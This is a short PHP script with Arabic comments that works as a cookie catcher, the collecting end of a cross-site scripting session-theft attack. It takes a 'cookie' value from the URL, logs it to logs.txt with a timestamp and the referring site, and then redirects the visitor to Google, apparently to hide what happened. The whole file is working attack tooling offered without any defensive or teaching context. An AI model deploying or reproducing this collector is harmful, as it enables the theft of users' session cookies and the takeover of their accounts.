<?php
// تحديد مسار ملف logs.txt
$logFile = __DIR__ . '/logs.txt';

// التحقق من وجود باراميتر 'cookie' في الـ URL
if (isset($_GET['cookie'])) {
    // الحصول على قيمة 'cookie' من الـ URL
    $cookie = $_GET['cookie'];
    
    // الحصول على عنوان الموقع الذي جاء منه الطلب
    $referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Unknown';
    
    // الحصول على التاريخ والوقت الحاليين
    $timestamp = date('Y-m-d H:i:s');

    // كتابة المعلومات في ملف logs.txt
    $logData = "Timestamp: $timestamp | Cookie: $cookie | Referrer: $referrer\n";
    
    // التحقق من عملية الكتابة في الملف
    if (file_put_contents($logFile, $logData, FILE_APPEND) !== false) {
        echo "Data logged successfully!";
    } else {
        echo "Failed to write to log file!";
    }

    // إعادة التوجيه إلى Google
    header("Location: https://www.google.com");
    exit();
} else {
    echo "No cookie parameter provided.";
}
?>
